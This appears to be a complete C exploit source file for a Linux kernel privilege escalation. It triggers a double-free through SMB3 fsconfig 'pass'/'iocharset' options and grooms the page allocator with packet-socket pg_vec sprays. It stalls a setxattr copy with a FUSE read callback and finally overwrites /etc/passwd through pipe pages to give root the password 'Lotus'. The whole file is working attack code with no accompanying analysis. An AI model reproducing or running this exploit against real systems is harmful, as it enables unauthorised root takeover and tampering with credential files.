#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <errno.h>
#include <sys/stat.h>
#include <fuse.h>
// #include <keyutils.h>
#include <semaphore.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/xattr.h>
#include <sys/resource.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>


#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>




#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define FILE_NUM 0x400

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40




void leak(size_t *content,size_t size)
{
    printf("[*]Leak: ");
    for(int i=0;i<(int)(size/8);i++)
    {
       printf("%llx\n",content[i]);
    }
}


#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define FSCONFIG_SET_STRING 1
#define PG_VEC_NUM 0X33
#define PIPE_NUM 0x100

char *tmp_content=NULL;
char buf[0x1000];
size_t tmp_buf[0x100];
size_t leak_buf[0x1000];
size_t file_leak_buf[0x200];
int file_fd[FILE_NUM];
int pipe_fd[PIPE_NUM][2];
int fd1,fd2;
int packet_fd[PGV_8PAGES_START_IDX+PGV_8PAGES_SPRAY_NUM];
char *packet_page[0x60];
int pg_vec_fd[PG_VEC_NUM];
sem_t thread_mutex;
pthread_t setxattr_thread;
void *page_addr;
void *read_addr;
int offset;
int check_fd;
sem_t *sem,*sem2;
const char* sem_name = "/process_semaphore";
const char* sem_name2 = "/process_semaphore2";



void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n",msg);
    exit(-1);
}

uint64_t r[1] = {0xffffffffffffffff};


// static const char *content = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
static const char *content = "Hello, World!\n";

static int getattr_callback(const char *path, struct stat *stbuf)
{
	puts("[+] getattr_callback");
	memset(stbuf, 0, sizeof(struct stat));

	if (strcmp(path, "/file") == 0) {
		stbuf->st_mode = S_IFREG | 0777;
		stbuf->st_nlink = 1;
		stbuf->st_size = strlen(content);
		return 0;
	}

	return -ENOENT;
}

void check(char *data)
{
  
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
	puts("[+] open_callback");
	return 0;
}

static int read_callback(const char *path, char *buf, size_t size, off_t offset,
			 struct fuse_file_info *fi)
{
	puts("[+] read_callback");
	if(access("/tmp/lotus7",F_OK)<0)
	{
		system("echo \"lotus\">/tmp/lotus7");
	}
	else
	{
		system("echo \"lotus\">/tmp/lotus77");
	}

  // int tmp_fd = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
  sem_post(sem);
  
  
  // if (tmp_fd<0)
  // {
  //   system("touch /tmp/fail");
  // }
  // else{
  //   system("touch tmp/success");
  // }

	if (strcmp(path, "/file") == 0) {

		size_t len = strlen(content);
		if (offset >= len)
			return 0;

		if ((size > len) || (offset + size > len)) {
			memcpy(buf, content + offset, len - offset);
      sem_wait(sem2);
			return len - offset;
		} else {
			memcpy(buf, content + offset, size);
      sem_wait(sem2);
			return size;
		}
	}
}

static struct fuse_operations fops = {
	.getattr = getattr_callback,
	.open = open_callback,
	.read = read_callback,
};

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        errExit("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        errExit("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        errExit("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        errExit("bind(AF_PACKET): %m");
    }

    return s;
}


// count -->page count size-->0x1000 pg_vec heap size = 0x8*count
int pagealloc_pad(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}



void setxattr_thread_func()
{
//   sem_wait(&thread_mutex);
//   leak_buf[offset]=0x1000;
//   leak_buf[offset+0x8]=0;
  memset((void*)(0x200000-0x1),0x10,0x1);
  setxattr("/exp", "Lotus",(void*)(0x200000-0x2), 0x3, 0);
}



static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20; 
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE

 // RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 设置为4096
    rlim.rlim_cur = rlim.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("[-] setrlimit");
    }
  
}

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

const char* my_argv[] = { "/exp", "/tmp/fuse/", NULL };

int main(int argc, char *argv[])
{

  puts("[*] Do some prepare.");

  system("touch /tmp/lotus&&\\chmod 777 /tmp/lotus");

  for(int i=0;i<PIPE_NUM;i++)
  {
    if(pipe(pipe_fd[i])<0)
    {
      errExit("pipe error!");
    }
  }

  sem = sem_open(sem_name, O_CREAT, S_IRUSR | S_IWUSR, 0);
    if (sem == SEM_FAILED) {
        perror("Error creating/opening semaphore");
        return 1;
    }

  sem2 = sem_open(sem_name2, O_CREAT, S_IRUSR | S_IWUSR, 0);
    if (sem == SEM_FAILED) {
        perror("Error creating/opening semaphore");
        return 1;
    }

  if (sem_init(&thread_mutex, 0, 0) != 0) {
        perror("sem_init");
        exit(1);
    }
  
  if(access("/tmp/fuse/",F_OK)<0)
  {
    system("mkdir /tmp/fuse/");
    if(!fork())
    {
        fuse_main(2, my_argv, &fops, NULL);
    }
  }
  
        /* create new namespace to get CAP_SYS_ADMIN */
  if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
            errExit("FAILED to unshare()!");
        }

  if (unshare(CLONE_NEWNET)) {
        errExit("FAILED to unshare()!");
    }

  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  adjust_rlimit();
  
  tmp_content = malloc(0x1000);
  adjust_rlimit();
  
  // sem_wait(&mutex);
  sleep(2);
  int ffd = open("/tmp/fuse/file", O_RDWR);
  if(ffd<0)
  {
    errExit("open fuse file failed!");
  }
	page_addr = mmap(0x200000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, ffd, 0);
  read_addr = mmap(0x1ff000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(read_addr!=0x1ff000||page_addr!=0x200000)
	{
		printf("0x%x,0x%x\n",read_addr,page_addr);
		puts("error!");
		return 0;
	}

  //for page-level fengshui
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        packet_fd[i] = pagealloc_pad(1, 0x1000);
        if(packet_fd[i]<0)
        {
          errExit("error in PGV_1PAGE_SPRAY");
        }
    }
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        packet_fd[i+PGV_4PAGES_START_IDX] = pagealloc_pad(4, 0x1000);
        if(packet_fd[i+PGV_4PAGES_START_IDX]<0)
        {
          errExit("error in PGV_4PAGE_SPRAY");
        }
    }
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        packet_fd[i+PGV_8PAGES_START_IDX] = pagealloc_pad(8, 0x1000);
        if(packet_fd[i+PGV_8PAGES_START_IDX]<0)
        {
          errExit("error in PGV_8PAGE_SPRAY");
        }
    }
  
// 调用fsopen系统调用创建一个SMB3文件系统
    int fd = syscall(__NR_fsopen, "smb3", 0);
    if (fd < 0) {
        errExit("Failed to create SMB3 file system %m");
    }
    // 成功创建SMB3文件系统
    char *val = "AAAAAA";
    char *val1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    puts("SMB3 file system created successfully\n");
    // 调用fsconfig系统调用设置SMB3文件系统的password
    if (syscall(__NR_fsconfig,fd,FSCONFIG_SET_STRING, "pass",val,0) < 0) {
        errExit("Failed to set SMB3 file system context %m");
    }

    memset(packet_fd, 0, sizeof(packet_fd));

    puts("[*] spray pgv order-1 pages...");
    for (int i = 0; i < PG_VEC_NUM-0x1; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            close(packet_fd[i+(pgv_4pages_start_idx++)]);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            close(packet_fd[pgv_1page_start_idx += 2]);
        }


        pg_vec_fd[i] = pagealloc_pad(1, 0x1000);
        if(pg_vec_fd[i]<0)
        {
          errExit("error in PG_VEC_SPRAY");
        }
    }

    puts("SMB3 file system alloc password successfully\n");
    puts("free password\n");
    syscall(__NR_fsconfig,fd,FSCONFIG_SET_STRING, "iocharset",val1,0);

    syscall(__NR_fsconfig,fd,FSCONFIG_SET_STRING, "iocharset",val1,0);

  

  puts("Add 0x8 pg_vec\n");
  memset(read_addr,0,0x1000);
  
  pg_vec_fd[PG_VEC_NUM-0x1] = pagealloc_pad(1, 0x1000);

  
  
  puts("Setxattr+fuse to edit the page low byte\n");

  
    int result = pthread_create(&setxattr_thread, NULL, setxattr_thread_func, NULL);
    if (result != 0) {
        printf("Error creating thread. Code: %d\n", result);
        return 1;
    }

  sem_wait(sem);

  // for (int i = (PG_VEC_NUM/2)+1; i <PG_VEC_NUM; i++) {
  //       /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
  //       if (i % 19 == 0) {
  //           close(packet_fd[i+(pgv_4pages_start_idx++)]);
  //       }

  //       /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
  //       if (i % 21 == 0) {
  //           close(packet_fd[pgv_1page_start_idx += 2]);
  //       }

  //       close(pg_vec_fd[i-PG_VEC_NUM/2]);
  //       pg_vec_fd[i] = pagealloc_pad(1, 0x1000);
  //       if(pg_vec_fd[i]<0)
  //       {
  //         errExit("error in PG_VEC_SPRAY");
  //       }
  //   }
  
  
  
  

  // for (int i = 0; i < PG_VEC_NUM; i++) 
  // {
  //    if (!pg_vec_fd[i]||i==PG_VEC_NUM-0x1) {
  //           continue;
  //       }
  //       // packet mmap to userland
  //       packet_page[i] = (char *)mmap(NULL, 0x1000 * 1,
  //                                 PROT_READ | PROT_WRITE, MAP_SHARED, pg_vec_fd[i], 0);
  //       if (!pg_vec_fd[i] || (ssize_t)packet_page[i]< 0) {
  //           printf("mmap error:0x%x:0x%llx\n",i,packet_page[i]);
  //           break;
  //       }

        
  // }

  
  
  puts("Close the packet_fd\n");
  sleep(2);
  close(pg_vec_fd[PG_VEC_NUM-0x1]);

  getchar();
  char *tmp_content = malloc(0x1000);
  memset(tmp_content,0x41,0x800);
  for(int i=0;i<PIPE_NUM;i++)
  {
    if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
            printf("[x] failed to extend %d pipe!\n", i);
            return -1;
        }
        write(pipe_fd[i][1],tmp_content,0x44);
  }

  // for (int i = 0; i < PG_VEC_NUM; i++) 
  // {
  //    if (!pg_vec_fd[i]||i==PG_VEC_NUM-0x1) {
  //           continue;
  //       }
  //       // packet mmap to userland
  //       packet_page[i] = (char *)mmap(NULL, 0x1000 * 1,
  //                                 PROT_READ | PROT_WRITE, MAP_SHARED, pg_vec_fd[i], 0);
  //       if (!pg_vec_fd[i] || (ssize_t)packet_page[i]< 0) {
  //           printf("mmap error:0x%x:0x%llx\n",i,packet_page[i]);
  //           close(pg_vec_fd[i]);

  //           // for(int i=FILE_NUM/2;i<FILE_NUM;i++)
  //           // {
  //           //     file_fd[i] = open("/tmp/lotus",O_RDWR);
  //           //     if(!file_fd[i])
  //           //     {
  //           //         errExit("Open normal file ERROR!");
  //           //     }
  //           // }
  //           break;
  //       }        
  // }

  

  for(int i=PG_VEC_NUM-0x10;i<PG_VEC_NUM-0x1;i++)
  {
    close(pg_vec_fd[i]);
  }

  for(int i=0;i<FILE_NUM;i++)
    {
        file_fd[i] = open("/etc/passwd",0);
        if(!file_fd[i])
        {
            printf("Open pwd file ERROR:0x%x!\n",i);
        }
    }


  
    

  for(int i=0;i<PIPE_NUM;i++)
  {
    int a[2];
    a[0] = 0x480e801f;
    write(pipe_fd[i][1],a,0x4);
  }

  char *data = "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus

    system("cp /etc/passwd /tmp/passwd");
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!",i); CLOSE
            }

        }
  

  return 0;
}
